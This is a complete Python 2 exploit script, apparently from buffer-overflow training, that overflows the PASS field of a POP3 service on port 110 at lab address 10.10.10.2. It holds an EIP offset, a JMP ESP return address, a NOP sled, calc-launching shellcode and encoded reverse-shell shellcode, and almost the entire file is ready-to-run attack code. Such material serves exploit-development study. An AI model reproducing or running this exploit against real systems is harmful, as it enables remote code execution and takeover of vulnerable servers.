#!/usr/bin/env python2

import socket
import struct

RHOST = "10.10.10.2"
RPORT = 110

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# OFFSETS
# EIP 4654
# ESP 342
# EBP 4650
# jmp_esp in slmfc.dll at 5f4a358f
jmp_esp = 0x5f4a358f
nop_sled = "\x90" * 32

buf_totlen = 5000
offset_srp = 4654

shellcode_calc =  b""
shellcode_calc += b"\xd9\xec\xb8\xd5\x9d\xbe\x8e\xd9\x74\x24"
shellcode_calc += b"\xf4\x5a\x33\xc9\xb1\x31\x83\xc2\x04\x31"
shellcode_calc += b"\x42\x14\x03\x42\xc1\x7f\x4b\x72\x01\xfd"
shellcode_calc += b"\xb4\x8b\xd1\x62\x3c\x6e\xe0\xa2\x5a\xfa"
shellcode_calc += b"\x52\x13\x28\xae\x5e\xd8\x7c\x5b\xd5\xac"
shellcode_calc += b"\xa8\x6c\x5e\x1a\x8f\x43\x5f\x37\xf3\xc2"
shellcode_calc += b"\xe3\x4a\x20\x25\xda\x84\x35\x24\x1b\xf8"
shellcode_calc += b"\xb4\x74\xf4\x76\x6a\x69\x71\xc2\xb7\x02"
shellcode_calc += b"\xc9\xc2\xbf\xf7\x99\xe5\xee\xa9\x92\xbf"
shellcode_calc += b"\x30\x4b\x77\xb4\x78\x53\x94\xf1\x33\xe8"
shellcode_calc += b"\x6e\x8d\xc5\x38\xbf\x6e\x69\x05\x70\x9d"
shellcode_calc += b"\x73\x41\xb6\x7e\x06\xbb\xc5\x03\x11\x78"
shellcode_calc += b"\xb4\xdf\x94\x9b\x1e\xab\x0f\x40\x9f\x78"
shellcode_calc += b"\xc9\x03\x93\x35\x9d\x4c\xb7\xc8\x72\xe7"
shellcode_calc += b"\xc3\x41\x75\x28\x42\x11\x52\xec\x0f\xc1"
shellcode_calc += b"\xfb\xb5\xf5\xa4\x04\xa5\x56\x18\xa1\xad"
shellcode_calc += b"\x7a\x4d\xd8\xef\x10\x90\x6e\x8a\x56\x92"
shellcode_calc += b"\x70\x95\xc6\xfb\x41\x1e\x89\x7c\x5e\xf5"
shellcode_calc += b"\xee\x63\xbc\xdc\x1a\x0c\x19\xb5\xa7\x51"
shellcode_calc += b"\x9a\x63\xeb\x6f\x19\x86\x93\x8b\x01\xe3"
shellcode_calc += b"\x96\xd0\x85\x1f\xea\x49\x60\x20\x59\x69"
shellcode_calc += b"\xa1\x43\x3c\xf9\x29\xaa\xdb\x79\xcb\xb2"

rev_shell =  b""
rev_shell += b"\xda\xda\xbf\xe9\xb7\x98\x98\xd9\x74\x24\xf4"
rev_shell += b"\x58\x33\xc9\xb1\x52\x31\x78\x17\x83\xc0\x04"
rev_shell += b"\x03\x91\xa4\x7a\x6d\x9d\x23\xf8\x8e\x5d\xb4"
rev_shell += b"\x9d\x07\xb8\x85\x9d\x7c\xc9\xb6\x2d\xf6\x9f"
rev_shell += b"\x3a\xc5\x5a\x0b\xc8\xab\x72\x3c\x79\x01\xa5"
rev_shell += b"\x73\x7a\x3a\x95\x12\xf8\x41\xca\xf4\xc1\x89"
rev_shell += b"\x1f\xf5\x06\xf7\xd2\xa7\xdf\x73\x40\x57\x6b"
rev_shell += b"\xc9\x59\xdc\x27\xdf\xd9\x01\xff\xde\xc8\x94"
rev_shell += b"\x8b\xb8\xca\x17\x5f\xb1\x42\x0f\xbc\xfc\x1d"
rev_shell += b"\xa4\x76\x8a\x9f\x6c\x47\x73\x33\x51\x67\x86"
rev_shell += b"\x4d\x96\x40\x79\x38\xee\xb2\x04\x3b\x35\xc8"
rev_shell += b"\xd2\xce\xad\x6a\x90\x69\x09\x8a\x75\xef\xda"
rev_shell += b"\x80\x32\x7b\x84\x84\xc5\xa8\xbf\xb1\x4e\x4f"
rev_shell += b"\x6f\x30\x14\x74\xab\x18\xce\x15\xea\xc4\xa1"
rev_shell += b"\x2a\xec\xa6\x1e\x8f\x67\x4a\x4a\xa2\x2a\x03"
rev_shell += b"\xbf\x8f\xd4\xd3\xd7\x98\xa7\xe1\x78\x33\x2f"
rev_shell += b"\x4a\xf0\x9d\xa8\xad\x2b\x59\x26\x50\xd4\x9a"
rev_shell += b"\x6f\x97\x80\xca\x07\x3e\xa9\x80\xd7\xbf\x7c"
rev_shell += b"\x06\x87\x6f\x2f\xe7\x77\xd0\x9f\x8f\x9d\xdf"
rev_shell += b"\xc0\xb0\x9e\x35\x69\x5a\x65\xde\x9c\x91\x6f"
rev_shell += b"\x1a\xc9\xa7\x6f\x26\xdb\x21\x89\x4c\xcb\x67"
rev_shell += b"\x02\xf9\x72\x22\xd8\x98\x7b\xf8\xa5\x9b\xf0"
rev_shell += b"\x0f\x5a\x55\xf1\x7a\x48\x02\xf1\x30\x32\x85"
rev_shell += b"\x0e\xef\x5a\x49\x9c\x74\x9a\x04\xbd\x22\xcd"
rev_shell += b"\x41\x73\x3b\x9b\x7f\x2a\x95\xb9\x7d\xaa\xde"
rev_shell += b"\x79\x5a\x0f\xe0\x80\x2f\x2b\xc6\x92\xe9\xb4"
rev_shell += b"\x42\xc6\xa5\xe2\x1c\xb0\x03\x5d\xef\x6a\xda"
rev_shell += b"\x32\xb9\xfa\x9b\x78\x7a\x7c\xa4\x54\x0c\x60"
rev_shell += b"\x15\x01\x49\x9f\x9a\xc5\x5d\xd8\xc6\x75\xa1"
rev_shell += b"\x33\x43\x95\x40\x91\xbe\x3e\xdd\x70\x03\x23"
rev_shell += b"\xde\xaf\x40\x5a\x5d\x45\x39\x99\x7d\x2c\x3c"
rev_shell += b"\xe5\x39\xdd\x4c\x76\xac\xe1\xe3\x77\xe5"

buf = ""
buf += "A" * (offset_srp - len(buf))
buf += struct.pack("<I", jmp_esp)
buf += nop_sled
buf += shellcode_calc
buf += "D"*(buf_totlen - len(buf))

data = s.recv(1024)
s.send('USER username' + '\r\n')
data = s.recv(1024)
s.send('PASS ' + buf + '\r\n')
data = s.recv(1024)
s.close
